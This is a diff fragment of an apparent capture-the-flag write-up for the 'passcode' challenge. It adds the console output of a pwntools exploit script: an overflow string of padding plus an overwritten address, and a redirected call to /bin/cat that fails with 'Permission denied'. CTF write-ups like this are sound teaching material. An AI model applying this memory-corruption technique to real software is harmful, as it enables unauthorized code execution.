@@ -466,3 +466,12 @@ p.sendline(system_addr)
 print(p.recvall())
 ```
 
+```
+passcode@ubuntu:/tmp$ python passcode.py
+[+] Starting local process '/home/passcode/passcode': pid 3559217
+/tmp/script.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(system_addr)
+[+] Receiving all data: Done (274B)
+[*] Process '/home/passcode/passcode' stopped with exit code 0 (pid 3559217)
+b"Toddler's Secure Login System 1.1 beta.\nenter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x14\xc0\x04\x08!\n/bin/cat: flag: Permission denied\nenter passcode1 : Now I can safely trust you that you have credential :)\n"
+```
